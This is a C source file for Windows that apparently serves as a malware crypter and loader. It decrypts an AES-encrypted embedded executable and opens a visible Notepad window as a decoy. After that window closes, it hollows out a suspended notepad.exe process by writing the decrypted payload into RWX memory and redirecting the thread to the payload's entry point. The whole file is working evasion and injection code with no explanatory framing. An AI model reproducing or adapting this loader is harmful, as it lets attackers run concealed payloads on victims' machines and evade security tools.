#include <windows.h>
#include <stdint.h>
#include "aes.h"
#include "key_iv.h"
#include "payload_data.h"

void injectPE(void* payload, const char* target) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)payload + dosHeader->e_lfanew);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };

    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return;

    LPVOID base = VirtualAllocEx(pi.hProcess,
        (LPVOID)ntHeaders->OptionalHeader.ImageBase,
        ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!base) {
        base = VirtualAllocEx(pi.hProcess, NULL,
            ntHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
    }

    WriteProcessMemory(pi.hProcess, base, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
            (LPVOID)((BYTE*)base + section[i].VirtualAddress),
            (LPVOID)((BYTE*)payload + section[i].PointerToRawData),
            section[i].SizeOfRawData,
            NULL);
    }

    GetThreadContext(pi.hThread, &ctx);
#ifdef _WIN64
    ctx.Rcx = (DWORD64)((BYTE*)base + ntHeaders->OptionalHeader.AddressOfEntryPoint);
#else
    ctx.Eax = (DWORD)((BYTE*)base + ntHeaders->OptionalHeader.AddressOfEntryPoint);
#endif
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);
}

void bringToFront(DWORD pid) {
    HWND hwnd = NULL;
    for (int i = 0; i < 50 && hwnd == NULL; i++) {
        hwnd = GetTopWindow(NULL);
        while (hwnd) {
            DWORD winPid = 0;
            GetWindowThreadProcessId(hwnd, &winPid);
            if (winPid == pid && IsWindowVisible(hwnd)) {
                SetForegroundWindow(hwnd);
                ShowWindow(hwnd, SW_SHOW);
                return;
            }
            hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
        }
        Sleep(100);
    }
}

int main() {
    unsigned char* encData = malloc(payload_enc_len);
    if (!encData) return 1;
    memcpy(encData, payload_enc, payload_enc_len);

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, AES_KEY, AES_IV);
    AES_CBC_decrypt_buffer(&ctx, encData, payload_enc_len);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        bringToFront(pi.dwProcessId);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        injectPE(encData, "C:\\Windows\\System32\\notepad.exe");
    }
    free(encData);
    return 0;
}
